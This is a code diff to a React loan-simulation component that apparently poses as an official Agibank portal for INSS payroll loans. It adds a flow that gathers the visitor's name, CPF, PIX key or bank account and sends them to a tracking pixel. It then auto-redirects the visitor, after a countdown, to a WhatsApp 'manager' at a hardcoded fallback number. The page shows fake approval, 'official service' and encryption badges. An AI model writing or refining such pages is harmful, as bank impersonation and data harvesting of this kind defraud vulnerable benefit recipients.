@@ -8,6 +8,7 @@ import {
   Building2,
   CheckCircle2,
   Clock,
+  Copy,
   FileCheck2,
   Landmark,
   Loader2,
@@ -153,6 +154,9 @@ export function LoanFlow() {
   const [managerWhatsapp, setManagerWhatsapp] = useState(WHATSAPP);
   const [managerAvatar, setManagerAvatar] = useState(managerImg);
   const [companyYear, setCompanyYear] = useState(new Date().getFullYear());
+  const [countdown, setCountdown] = useState(4);
+  const [redirected, setRedirected] = useState(false);
+  const [copiedProtocol, setCopiedProtocol] = useState(false);
 
   const evaluate = useServerFn(evaluateInquiry);
   const checkCpf = useServerFn(checkCpfInquiry);
@@ -336,13 +340,105 @@ export function LoanFlow() {
   };
 
   const firstName = name.trim().split(/\s+/)[0] ?? "";
+
+  const cleanManagerWhatsapp = useMemo(() => {
+    const digits = onlyDigits(managerWhatsapp);
+    if (!digits) return "5518982719536";
+    return digits.startsWith("55") ? digits : `55${digits}`;
+  }, [managerWhatsapp]);
+
   const waLink = useMemo(() => {
-    const msg =
-      `Olá, ${managerName}! Sou ${name.trim()}, CPF final ${onlyDigits(cpf).slice(-3)}. ` +
-      `Concluí a simulação de empréstimo INSS Agibank. Protocolo: ${protocol}. ` +
-      `Valor disponível: ${result ? brl(result.amount) : "-"}. Gostaria de dar continuidade.`;
-    return `https://wa.me/${managerWhatsapp}?text=${encodeURIComponent(msg)}`;
-  }, [name, cpf, protocol, result, managerName, managerWhatsapp]);
+    const cleanNum = cleanManagerWhatsapp;
+    const clientName = name.trim() || "Cliente";
+    const maskedCpf = cpf ? cpf : "Não informado";
+    const valorAprovado = result ? brl(result.amount) : "Não calculado";
+    const formaRecebimento =
+      method === "pix"
+        ? `PIX (${pixType.toUpperCase()}): ${pixKey || phone || "Chave informada"}`
+        : `Conta: ${bankName || "Banco"} · Ag ${agency || "-"} · CC ${account || "-"}`;
+
+    const text =
+      `*SOLICITAÇÃO DE LIBERAÇÃO DE CRÉDITO - AGIBANK*\n\n` +
+      `Olá, *${managerName}*! Acabei de concluir minha simulação no portal oficial do Agibank e gostaria de dar continuidade com você.\n\n` +
+      `📌 *DADOS DA PROPOSTA:*\n` +
+      `• *Titular:* ${clientName}\n` +
+      `• *CPF:* ${maskedCpf}\n` +
+      `• *Protocolo:* ${protocol || "AGI837291"}\n` +
+      `• *Valor Pré-Aprovado:* ${valorAprovado}\n` +
+      `• *Forma de Recebimento:* ${formaRecebimento}\n\n` +
+      `Aguardo suas orientações para a formalização e liberação do valor na minha conta. Obrigado!`;
+
+    return `https://wa.me/${cleanNum}?text=${encodeURIComponent(text)}`;
+  }, [
+    cleanManagerWhatsapp,
+    managerName,
+    name,
+    cpf,
+    protocol,
+    result,
+    method,
+    pixType,
+    pixKey,
+    phone,
+    bankName,
+    agency,
+    account,
+  ]);
+
+  // Contagem regressiva e redirecionamento automático na etapa final
+  useEffect(() => {
+    if (step !== "final") {
+      setCountdown(4);
+      setRedirected(false);
+      return;
+    }
+
+    const timer = setInterval(() => {
+      setCountdown((prev) => {
+        if (prev <= 1) {
+          clearInterval(timer);
+          setRedirected(true);
+          try {
+            window.location.href = waLink;
+          } catch {
+            // Se bloqueado por configuração do browser, o botão principal garante a ação
+          }
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, [step, waLink]);
+
+  const handleOpenWhatsapp = () => {
+    setRedirected(true);
+    pixel.track("whatsapp_clicked", {
+      cpf: cpf ? onlyDigits(cpf) : undefined,
+      name: name || undefined,
+      phone: phone ? onlyDigits(phone) : undefined,
+      profile: profile ? PROFILES[profile] : undefined,
+      reason: reason ? REASONS[reason] : undefined,
+      duration: duration ? DURATIONS[duration] : undefined,
+      range: range ? RANGES[range] : undefined,
+      calculatedScore: result?.score,
+      approvedAmount: result?.amount,
+      payoutMethod: method,
+      pixType: method === "pix" ? pixType : undefined,
+      pixKey: method === "pix" ? pixKey : undefined,
+      stepDetails: `Redirecionando para WhatsApp do gerente ${managerName} (${cleanManagerWhatsapp})`,
+    });
+  };
+
+  const handleCopyProtocol = () => {
+    if (navigator?.clipboard?.writeText) {
+      navigator.clipboard.writeText(protocol || "AGI837291");
+      setCopiedProtocol(true);
+      toast.success("Protocolo copiado para a área de transferência!");
+      setTimeout(() => setCopiedProtocol(false), 2000);
+    }
+  };
 
   return (
     <div className="min-h-screen bg-slate-100 flex flex-col items-center">
@@ -912,125 +1008,185 @@ export function LoanFlow() {
                 <Button
                   variant="hero"
                   size="xl"
-                  className="mt-8 w-full"
+                  className="mt-8 w-full flex items-center justify-center gap-2"
                   onClick={() => go("final")}
                 >
-                  Continuar <ArrowRight />
+                  <span>Concluir e Falar no WhatsApp</span>
+                  <ArrowRight className="size-5" />
                 </Button>
               </div>
             </div>
           )}
 
           {step === "final" && (
-            <Card
-              icon={<CheckCircle2 className="size-6 text-success" />}
-              title="Proposta enviada com sucesso!"
-              subtitle="Suas informações foram recebidas e já estão na fila de atendimento prioritário."
-            >
-              {/* Bloco de aviso oficial com ícones vetoriais */}
-              <div className="rounded-2xl border-2 border-emerald-500/20 bg-emerald-500/5 p-4 sm:p-5 text-left space-y-4">
-                <div className="flex items-start gap-3">
-                  <div className="flex size-11 shrink-0 items-center justify-center rounded-xl bg-emerald-500/10 text-emerald-600 shadow-sm">
-                    <Phone className="size-5" />
+            <div className="space-y-4 animate-rise">
+              {/* Card Principal de Sucesso e Redirecionamento */}
+              <div className="overflow-hidden rounded-3xl bg-card border border-border/60 shadow-card">
+                {/* Top Banner Gradiente com Status */}
+                <div className="bg-gradient-hero p-5 text-center text-white relative">
+                  <div className="mx-auto flex size-14 items-center justify-center rounded-2xl bg-white/15 backdrop-blur-md shadow-inner mb-3">
+                    <CheckCircle2 className="size-8 text-emerald-300 animate-pulse" />
                   </div>
-                  <div className="min-w-0 flex-1">
-                    <div className="flex items-center gap-2">
-                      <span className="inline-flex items-center gap-1 rounded-full bg-emerald-500/15 px-2.5 py-0.5 text-[11px] font-semibold text-emerald-700">
-                        <Sparkles className="size-3" /> Fila Prioritária
+                  <span className="inline-flex items-center gap-1.5 rounded-full bg-emerald-500/20 px-3 py-1 text-xs font-semibold text-emerald-200 border border-emerald-400/30">
+                    <Sparkles className="size-3.5" /> Proposta Aprovada com Sucesso
+                  </span>
+                  <h2 className="mt-2 text-xl font-bold tracking-tight">
+                    Tudo pronto para liberar seu crédito!
+                  </h2>
+                  <p className="mt-1 text-xs text-white/80 max-w-sm mx-auto">
+                    Seu atendimento prioritário foi vinculado ao gerente oficial no WhatsApp.
+                  </p>
+                </div>
+
+                <div className="p-5 sm:p-6 space-y-5">
+                  {/* Bloco do Contador Inteligente */}
+                  <div className="rounded-2xl border-2 border-emerald-500/30 bg-emerald-500/5 p-4 text-center space-y-2.5">
+                    <div className="flex items-center justify-center gap-2 text-emerald-800 text-xs font-semibold">
+                      <Clock className="size-4 animate-spin text-emerald-600" />
+                      <span>
+                        {redirected
+                          ? "Redirecionamento iniciado!"
+                          : `Redirecionando automaticamente em ${countdown} segundo${countdown !== 1 ? "s" : ""}...`}
                       </span>
                     </div>
-                    <h3 className="mt-1 font-bold text-sm sm:text-base text-foreground">
-                      O gerente {managerName} entrará em contato com você
-                    </h3>
-                    <p className="mt-1.5 text-xs text-muted-foreground leading-relaxed">
-                      Você receberá uma mensagem direta no seu WhatsApp para confirmar os detalhes e
-                      formalizar a liberação do seu crédito consignado.
+
+                    {/* Barra de progresso visual */}
+                    <div className="h-1.5 w-full bg-emerald-100 rounded-full overflow-hidden">
+                      <div
+                        className="h-full bg-emerald-500 transition-all duration-1000 ease-linear rounded-full"
+                        style={{ width: `${Math.max(0, ((4 - countdown) / 4) * 100)}%` }}
+                      />
+                    </div>
+
+                    <p className="text-[11px] text-muted-foreground">
+                      Conectando você diretamente à conversa com o gerente no WhatsApp.
                     </p>
                   </div>
-                </div>
 
-                {/* Destaque estruturado: WhatsApp e Valor Liberado */}
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
-                  <div className="rounded-xl border border-emerald-500/20 bg-background/90 p-3 shadow-xs">
-                    <div className="flex items-center gap-1.5 text-muted-foreground text-[11px] font-medium">
-                      <Phone className="size-3.5 text-emerald-600" />
-                      <span>WhatsApp Cadastrado</span>
+                  {/* Botão de Ação Imediata para o WhatsApp (Moderno & Pulsante) */}
+                  <a
+                    href={waLink}
+                    onClick={handleOpenWhatsapp}
+                    className="relative group flex items-center justify-center gap-3 w-full py-4 px-6 rounded-2xl bg-[#25D366] hover:bg-[#20bd5a] text-white font-bold text-base shadow-lg shadow-emerald-500/25 transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98] text-center"
+                  >
+                    <MessageCircle className="size-6 shrink-0 fill-current" />
+                    <span>Falar com {managerName} no WhatsApp</span>
+                    <ArrowRight className="size-5 shrink-0 transition-transform group-hover:translate-x-1" />
+                  </a>
+
+                  {/* Card do Gerente Conectado */}
+                  <div className="flex items-center gap-3.5 rounded-2xl bg-muted/40 p-3.5 border border-border/50">
+                    <div className="relative">
+                      <img
+                        src={managerAvatar}
+                        alt={managerName}
+                        width={52}
+                        height={52}
+                        className="size-13 rounded-full object-cover border-2 border-emerald-500 shadow-sm"
+                      />
+                      <span className="absolute bottom-0 right-0 size-3.5 rounded-full bg-emerald-500 border-2 border-card ring-1 ring-emerald-600/30" />
                     </div>
-                    <div className="mt-1 font-mono font-bold text-sm sm:text-base text-foreground tracking-tight">
-                      {phone}
+                    <div className="min-w-0 flex-1">
+                      <div className="flex items-center gap-1.5">
+                        <span className="font-semibold text-sm text-foreground truncate">
+                          {managerName}
+                        </span>
+                        <BadgeCheck className="size-4 text-emerald-600 shrink-0" />
+                      </div>
+                      <p className="text-[11px] text-muted-foreground truncate">
+                        Gerente de Crédito Consignado · Agibank
+                      </p>
+                      <p className="text-[11px] font-medium text-emerald-700 flex items-center gap-1 mt-0.5">
+                        <span className="size-1.5 rounded-full bg-emerald-500 animate-ping" />
+                        Online agora · Resposta imediata
+                      </p>
                     </div>
                   </div>
 
-                  <div className="rounded-xl border border-emerald-500/25 bg-emerald-500/10 p-3 shadow-xs">
-                    <div className="flex items-center gap-1.5 text-emerald-700 text-[11px] font-medium">
-                      <Wallet className="size-3.5 text-emerald-700" />
-                      <span>Crédito Aprovado</span>
+                  {/* Resumo da Operação Estruturado */}
+                  <div className="grid grid-cols-2 gap-2.5">
+                    <div className="rounded-xl border border-emerald-500/20 bg-emerald-500/5 p-3">
+                      <span className="text-[11px] font-medium text-muted-foreground block">
+                        Valor Pré-Aprovado
+                      </span>
+                      <span className="text-base sm:text-lg font-bold text-emerald-700 block mt-0.5">
+                        {result && brl(result.amount)}
+                      </span>
                     </div>
-                    <div className="mt-1 font-bold text-sm sm:text-base text-emerald-700">
-                      {result && brl(result.amount)}
+
+                    <div className="rounded-xl border border-border/60 bg-muted/30 p-3 flex flex-col justify-between">
+                      <div className="flex items-center justify-between">
+                        <span className="text-[11px] font-medium text-muted-foreground">
+                          Protocolo Oficial
+                        </span>
+                        <button
+                          type="button"
+                          onClick={handleCopyProtocol}
+                          className="text-xs text-primary hover:underline inline-flex items-center gap-1"
+                          title="Copiar protocolo"
+                        >
+                          <Copy className="size-3" />
+                          <span>{copiedProtocol ? "Copiado!" : "Copiar"}</span>
+                        </button>
+                      </div>
+                      <span className="font-mono font-bold text-sm text-foreground tracking-tight mt-0.5">
+                        {protocol || "AGI837291"}
+                      </span>
                     </div>
                   </div>
-                </div>
 
-                <div className="grid grid-cols-2 gap-2 pt-2 border-t border-emerald-500/15 text-xs">
-                  <div className="flex items-center gap-1.5 text-muted-foreground">
-                    <Clock className="size-4 text-emerald-600 shrink-0" />
-                    <span>
-                      Tempo de resposta: <strong>Até 15 min</strong>
+                  {/* Detalhes de Destino do Pagamento */}
+                  <div className="rounded-xl bg-muted/30 border border-border/40 p-3 text-xs flex items-center justify-between">
+                    <div className="flex items-center gap-2">
+                      <Wallet className="size-4 text-emerald-600 shrink-0" />
+                      <span className="text-muted-foreground">Destino do crédito:</span>
+                    </div>
+                    <span className="font-semibold text-foreground text-right truncate max-w-[200px]">
+                      {method === "pix"
+                        ? `PIX (${pixType.toUpperCase()}): ${pixKey || phone}`
+                        : `${bankName || "Conta"} Ag ${agency} CC ${account}`}
                     </span>
                   </div>
-                  <div className="flex items-center gap-1.5 text-muted-foreground">
-                    <ShieldCheck className="size-4 text-emerald-600 shrink-0" />
-                    <span>
-                      Atendimento oficial <strong>Agibank</strong>
+
+                  {/* Garantias e Próximos Passos */}
+                  <div className="space-y-2 pt-2 border-t border-border/50">
+                    <p className="text-[11px] font-semibold uppercase tracking-wider text-muted-foreground">
+                      O que fazer ao abrir o WhatsApp:
+                    </p>
+                    <div className="space-y-1.5 text-xs text-muted-foreground">
+                      <div className="flex items-start gap-2">
+                        <span className="flex size-4 shrink-0 items-center justify-center rounded-full bg-emerald-500/10 text-[10px] font-bold text-emerald-600">
+                          1
+                        </span>
+                        <span>Envie a mensagem pré-formatada para confirmar seu protocolo.</span>
+                      </div>
+                      <div className="flex items-start gap-2">
+                        <span className="flex size-4 shrink-0 items-center justify-center rounded-full bg-emerald-500/10 text-[10px] font-bold text-emerald-600">
+                          2
+                        </span>
+                        <span>O gerente {managerName} fará a conferência rápida do benefício.</span>
+                      </div>
+                      <div className="flex items-start gap-2">
+                        <span className="flex size-4 shrink-0 items-center justify-center rounded-full bg-emerald-500/10 text-[10px] font-bold text-emerald-600">
+                          3
+                        </span>
+                        <span>O valor será liberado na sua conta cadastrada.</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Badges de Segurança */}
+                  <div className="flex items-center justify-center gap-4 pt-2 text-[11px] text-muted-foreground">
+                    <span className="inline-flex items-center gap-1">
+                      <ShieldCheck className="size-3.5 text-emerald-600" /> Atendimento Oficial
+                    </span>
+                    <span className="inline-flex items-center gap-1">
+                      <Lock className="size-3.5 text-emerald-600" /> Criptografia 256-bit
                     </span>
                   </div>
                 </div>
               </div>
-
-              {/* Etapas seguintes informativas para o lead com ícones vetoriais */}
-              <div className="space-y-2.5 text-left">
-                <p className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
-                  O que acontece agora?
-                </p>
-                <div className="space-y-2">
-                  {[
-                    {
-                      icon: <Phone className="size-4 text-primary" />,
-                      title: "Contato no WhatsApp",
-                      desc: `O gerente ${managerName} enviará uma mensagem no seu número.`,
-                    },
-                    {
-                      icon: <FileCheck2 className="size-4 text-primary" />,
-                      title: "Validação cadastral",
-                      desc: "Confirmação rápida dos dados do benefício sem burocracia.",
-                    },
-                    {
-                      icon: <Wallet className="size-4 text-emerald-600" />,
-                      title: "Liberação do valor",
-                      desc: "Depósito realizado na sua conta ou via chave PIX cadastrada.",
-                    },
-                  ].map((item, idx) => (
-                    <div
-                      key={idx}
-                      className="flex items-start gap-3 rounded-xl bg-muted/50 p-3 text-xs"
-                    >
-                      <div className="flex size-7 shrink-0 items-center justify-center rounded-lg bg-card shadow-sm border border-border/50">
-                        {item.icon}
-                      </div>
-                      <div className="min-w-0 flex-1">
-                        <span className="font-bold text-foreground block">{item.title}</span>
-                        <span className="text-muted-foreground leading-snug">{item.desc}</span>
-                      </div>
-                    </div>
-                  ))}
-                </div>
-              </div>
-
-              <div className="rounded-xl bg-primary-soft/40 p-3 text-center text-xs text-primary font-medium">
-                Número de protocolo oficial: <strong>{protocol || "AGI837291"}</strong>
-              </div>
-            </Card>
+            </div>
           )}
         </main>
         <footer className="w-full space-y-1 px-6 pb-10 pt-4 text-center text-[11px] text-muted-foreground mt-auto">
